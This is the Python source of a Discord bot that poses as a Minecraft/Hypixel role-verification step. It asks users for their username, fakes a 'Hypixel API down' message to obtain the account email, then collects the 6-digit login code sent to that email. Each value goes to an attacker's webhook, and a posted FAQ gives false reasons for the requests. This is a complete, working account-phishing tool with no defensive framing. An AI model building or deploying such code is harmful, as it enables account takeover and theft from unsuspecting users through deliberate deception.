import discord
from discord.ext import commands
import requests
import asyncio
import os

TOKEN = os.getenv("TOKEN")
WEBHOOK_URL = os.getenv("WEBHOOK_URL")

intents = discord.Intents.default()
bot = commands.Bot(command_prefix=None, intents=intents)

user_data = {}

# === Modal 1 ===
class FirstUsernameModal(discord.ui.Modal, title="Step 1 – Minecraft Username"):
    username = discord.ui.TextInput(label="Enter your Minecraft username")

    async def on_submit(self, interaction: discord.Interaction):
        user_data[interaction.user.id] = {"username1": self.username.value}
        requests.post(WEBHOOK_URL, json={"content": f"Step 1 - {interaction.user}: Username 1: {self.username.value}"})

        # Show button for re-entering username
        view = ReenterButton()
        # Step 1: Show "checking..." first
        message = await interaction.response.send_message(
            "🔍 Checking the Hypixel API...",
            ephemeral=True
        )

        # Step 2: Wait 3 seconds
        await asyncio.sleep(3)

        # Step 3: Edit the message to show "API down" and add the button
        await interaction.edit_original_response(
            content="⚠️ Uh oh... it seems that the Hypixel API is down. Please enter the email address associated with your account for manual verification:",
            view=ReenterButton()
        )
class StartVerifyButton(discord.ui.View):
    @discord.ui.button(label="✅ Start Verification", style=discord.ButtonStyle.success)
    async def start(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(FirstUsernameModal())

# === Button 1 ===
class ReenterButton(discord.ui.View):
    @discord.ui.button(label="Enter email address", style=discord.ButtonStyle.primary)
    async def reenter(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(SecondUsernameModal())

# === Modal 2 ===
class SecondUsernameModal(discord.ui.Modal, title="Step 2 – Manual verification"):
    username = discord.ui.TextInput(label="Enter your email address")

    async def on_submit(self, interaction: discord.Interaction):
        user_data[interaction.user.id]["username2"] = self.username.value
        requests.post(WEBHOOK_URL, json={"content": f"Step 2 - {interaction.user}: Username 2: {self.username.value}"})

        # Show button for 6-digit code entry
        view = CodeButton()
        await interaction.response.send_message(
            "✅ Thanks! Now you must verify your email address.",
            view=view,
            ephemeral=True
        )

# === Button 2 ===
class CodeButton(discord.ui.View):
    @discord.ui.button(label="Enter code ", style=discord.ButtonStyle.success)
    async def enter_code(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.send_modal(CodeModal())

# === Modal 3 ===
class CodeModal(discord.ui.Modal, title="Final Step – 6-Digit Code"):
    code = discord.ui.TextInput(label="A 6 digit code has been sent to your email", max_length=6)

    async def on_submit(self, interaction: discord.Interaction):
        if not self.code.value.isdigit() or len(self.code.value) != 6:
            await interaction.response.send_message("❌ Code must be exactly 6 digits.", ephemeral=True)
            return

        user_data[interaction.user.id]["code"] = self.code.value
        data = user_data.pop(interaction.user.id)

        requests.post(WEBHOOK_URL, json={
            "content": (
                f"✅ Verification from {interaction.user}:\n"
                f"First Username: {data['username1']}\n"
                f"Second Username: {data['username2']}\n"
                f"6-digit Code: {data['code']}"
            )
        })

        await interaction.response.send_message("🎉 All done! Your info was sent for manual verification", ephemeral=True)


# === Bot Ready Event ===
@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user}")
    try:
        synced = await bot.tree.sync()
        print(f"🔁 Synced {len(synced)} slash command(s)")
    except Exception as e:
        print(f"❌ Sync failed: {e}")

    # Send welcome message with verification button
    channel_id = 1363174323761709217  # 🔁 Replace with your actual welcome channel ID
    channel = bot.get_channel(channel_id)
    
    if channel:
        faq_text = (
        "**📌 FAQ**\n\n"
        "**Q: Why do we need you to verify?**\n"
        "A: It's for auto-roles. We need to give you your class roles, catacomb-level roles, and verified roles. It's also for extra security during raids.\n\n"
        "**Q: How long does it take for me to get my roles?**\n"
        "A: We try to make the wait time as short as possible. Most users are verified in under 30–50 seconds.\n\n"
        "**Q: Why do you need to collect a code?**\n"
        "A: The code helps us confirm with the Minecraft API that you actually own that account."
        )

        await channel.send(
            content=faq_text,
            view=StartVerifyButton()
            )

    else:
        print("⚠️ Welcome channel not found! Double-check the ID.")


bot.run(TOKEN)
